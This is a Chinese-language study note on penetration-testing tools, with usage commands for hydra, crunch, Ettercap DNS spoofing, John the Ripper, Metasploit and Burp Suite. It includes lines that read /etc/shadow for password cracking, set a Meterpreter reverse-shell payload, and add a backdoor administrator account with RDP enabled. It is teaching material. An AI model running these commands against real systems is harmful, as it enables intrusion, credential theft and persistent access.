# 渗透工具

## xhydra的使用

xhydra用来进行口令、账号、密码的爆破。支持FTP, MYSQL, SMTP, TELNET, SSH 等众多的协议爆破。

xhydra是hydra的图形化界面。

## crunch的使用

字典生成工具。

参数：min：设定最小字符串长度（必选）

​			max：设定最大字符串长度（必选）

​			-o：将生成的字典保存在指定文件中

​			-f：指定库文件模板

​			-t：指定密码输出的格式（默认为小写字母）

​			-p：指定元素集合

​			%：代表数字

​			^：代表特殊符号

​			@：代表小写字母

​			,：代表大写字母

eg.生成2-4位小写字母的字典，保存到1.txt中：

​	crunch 2 4 > 1.txt

​	生成以admin字符开头的后两位是数字的7位字典，保存到2.txt中：

​	crunch 7 7 -t admin%% > 2.txt

​	指定库文件中的，保存在hex-lower模板生成6位的字典3.txt中：

​	crunch 6 6 -f /usr/share/crunch/charset.lst hex-lower -o 3.txt

​	生成5位数字字典，保存在4.txt中：

​	crunch 5 5 0123456789 -o 4.txt

​	生成wxy，123，！@#这三个字符串组合的随机字典，保存在5.txt中：

​	crunch 3 3 -p wxy 123 !@# > 5.txt		//这里的最大和最小值指的是随机组合的个数

## Ettercap的使用

Ettercap是一个综合性的中间人攻击工具，可以进行ARP欺骗，DNS劫持等等常见的中间人攻击。

该工具的配置文件在/etc/ettrcap/下

DNS劫持在etter.dns文件中添加记录

\*			A			192.168.1.9

\*			PTR		192.168.1.9

\*是域名，这里是指所有域名，A和PTR是记录，192.168.1.9是解析地址

ettercap -G打开该工具图形化界面

攻击流程：

1. 准备欺骗网页，放在/var/www/html/目录下，并启动apache2服务。
2. 配置ettercap工具的配置文件errer.dns。
3. 设置ettercap的配置：启动ettercap—>设置eth0网卡—>扫描主机—>将网关与主机添加到target选项，网关加到target1，目标主机加到target2—>在mitm标签中选择在ARP欺骗—>选择plugins下Manage plugins的DNS spoof欺骗模块—>开始欺骗

## John the Ripper的使用

John全称 John the Ripper 是一个快速密码破解工具，用于在已知密文的情况下尝试解出明文，支持目前大多数加密算法，支持多种不同类型的系统架构。目前主要用于破解不够牢固的Unit/Linux 系统密码。

Linux中用户文件存储在/etc/passwd文件中，密码文件存储在/etc/shadow文件中，一般采用sha512加密算法存储密码。

unshadow命令可以将passwd和shadow组合成一个文件

unshadow /etc/passwd /etc/shadow > test.txt

使用john test.txt进行破解

## MSF漏洞高攻击框架

MSF全称The Metasloit framework，这是一个免费的可以下载的框架，通过它可以很容易的获取开发面对计算机的软件漏洞，实施攻击。它本身附带数百个已知软件漏洞的专业级攻击工具。在渗透中经常使用这个攻击框架，尤其是在内网渗透。

- exploit：利用漏洞进行攻击动作的模块
- auxiliary：负责执行信息收集、扫描、嗅探、指纹识别、口令猜测等功能的辅助模块
- post：后渗透模块
- payload：成功执行exploit模块后，真正在目标系统执行代码或指令
- encoder：对payload加密的模块
- nop：提高payload的稳定性模块
- evasion：用于创建免杀毒软件的木马

使用msfconsole进入msf控制台

命令：

- search：查找漏洞模块。eg.   search ms17-010    查找ms17-010漏洞模块
- use：使用查找到的模块。eg.    use 1	使用search出来的1模块
- info：查看模块的相关介绍信息。
- ​		其中模块基础配置中required中是yes的选项是必须要配置的参数。
- set：配置漏洞的参数。eg.    set rhosts 192.168.1.2	配置该漏洞的rhosts参数
- run：运行该漏洞。exploit和run相同。
- ​		结果前边有绿色的“+”说明对方的电脑存在该漏洞。
- set payload windows/x64/meterpreter/reverse_tcp：设定payload为meterpreter这种高级的shell，并设定为reverse_tcp反弹shell。
- show options：查看模块的配置参数。

meterpretershell相关命令：

- getuid：查看当前shell权限
- shell：得到目标的cmdshell
- chcp 65001：更换字符编码为UTF-8
- net user test1 123456 /add：添加账户
- net local group administrators test1 /add：将test1账户添加到管理员组
- run post/windows/manage/enable_rdp：开启目标主机的3389端口

## Dirbuster网站扫描工具的使用

Dirbuster网站目录扫描工具，它会通过暴力枚举的形式来发现目标可能存在的一些敏感目录文件，例如后台登陆点，源码泄露等。这些工具类似于python的爬虫。

图形化界面选项：

- Target URL：配置目标网站URL
- Work Method：工作方式，一般选择auto switch即可。
- Number Of Thread：线程数，Go Fater会锁定200线程。一般不要太多，10线程左右即可，太多的话IP容易被封。
- Select scanning type：分为List based brute force(字典扫描)和Pure Brute Force(暴力破解)。
- kali提供了一些常用的字典，存放在/usr/share/dirbuster/wordlists中。
- Select starting options：爆破的内容。Standard start point(标准模式爆破)或URL Fuzz(Fuzz模式爆破)

Standard start point的选项：

- Brute Force Dirs：枚举目录
- Brute Force Files：枚举文件
- Be Recursive：递归
- Use Blank extension：延伸
- Dir to start with：开始爆破的文件路径
- File extension：文件类型

### dirsearch脚本（python3脚本）

dirsearch可以用来扫描对方网站是否存在敏感文件/目录泄露。这个脚本是用python编写的。可以在github中下载。

命令：python3 dirsearch.py -u 目标网站 -e 扩展名

### Githack脚本（python2脚本）

Githack脚本是.git 源码泄露的利用脚本。利用该脚本，我们能够将网站源码拖取下来。可以在GitHub中下载。

命令：python GitHack.py 目标网站/.git/

### JSFinder脚本（python3脚本）

JSFinder脚本可以爬取网站JS文件中的一些接口。这个脚本同样也是使用python语言编写的。可以在github中下载。

命令：简单爬取：python3 JSFinder.py -u 目标网站

​			深度爬取：python3 JSFinder.py -u 目标网站 -d -ou xx_url.txt -os xx_domain.txt

​			参数：-d进行深度爬取；-ou指定爬取出的URL的文件名；-ox指定爬取出的子域名所保存的文件名

### SNETCracker

SNETCracker，超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可以快速发现弱密码，弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。

工具采用C#开发，需要安装.NET Framework 4.0，工具目前支持SSH、RDP、SMB、MySQL、SQLserver、Oracle、FTP、MongoDB、Memcached、PostgreSQL、Telnet、SMTP、SMTP_SSL、POP3、POP3_SSL、IMAP、IMAP_SSL、VNC、Redis等服务的弱口令检查工作。

### Burpsuite

Burpsuite是一款集成化的渗透测试工具，包含了很多功能，可以帮助我们高校地完成对web应用程序的渗透测试和攻击。Burpsuite有java语言编写，基于java自身的跨平台性。他需要手工配置一些参数，触发一些自动化流程，然后才会工作。

#### proxy模块

主要包括intercept、HTTP history、Websockets history、Options四个功能模块。

iptercept：该功能主要是控制抓取的数据包，用于显示修改HTTP请求及相应内容，并可以将拦截的HTTP请求快速发送至其他模块处理。

- Forward：放过该数据包；Drop：把数据包丢弃；Intercept is on/off：开启/关闭抓包；Action：同右键菜单。在这里可以将请求包发送到其他的模块或者对数据包进行其他操作。
- RAW：以纯文本形式显示数据包；Params：包含参数URL查询字符串、cookie请求，并可双击该请求进行修改；Hex：可编辑数据包的二进制数据，在进行00截断是非常好用。

history：该模块将记录经过代理服务器访问的所有请求，即使当intercept is off时也还会记录。包括Host（主机）、Method（请求方式）、URL（请求地址）、Params（参数）、Edited（编辑）、Status（状态）、Length（响应字节长度）、MIME type（响应的MIME类型）、Extension（地址文件扩展名）、Title（页面标题）、Comment（注释）、SSL、IP（目标IP地址）、Cookies、Time（发出请求时间）、Listener port（监听端口）。

Websockets history：该模块用于记录Websockets的数据包，是HTML5中最强大的通行功能，定义了一个全双工的通信信道，只需Web上的一个Socket即可进行通信，能减少不必要的网络流量并降低网络延迟。

Options：该模块主要用于设置代理监听、请求和响应、拦截反应、匹配和替换、SSL等。有时我们用proxy模块拦截请求会拦截到一些其他站点的请求，这时我们可以在Options中配置。配置只拦截目标的网站请求。

#### repeater模块

Burpsuite中的repeater模块便是重放模块，用于修改发送过来的请求，然后多次测试返回的响应。点击send，便可以发送过去。

#### intruder模块

Burpsuite中的intruder是爆破模块，可以多次重放请求，设置爆破模式、设置字典，我们可以利用它爆破、遍历数据。

- target：设置目标信息

- Positions：设置爆破位置

  爆破模式：sniper-单一模式；Cluster bomb-急速爆破模式

- Payloads：设置用于爆破的字典，可以设置爆破字段的类型和字典加密
- Options：用于配置爆破配置信息

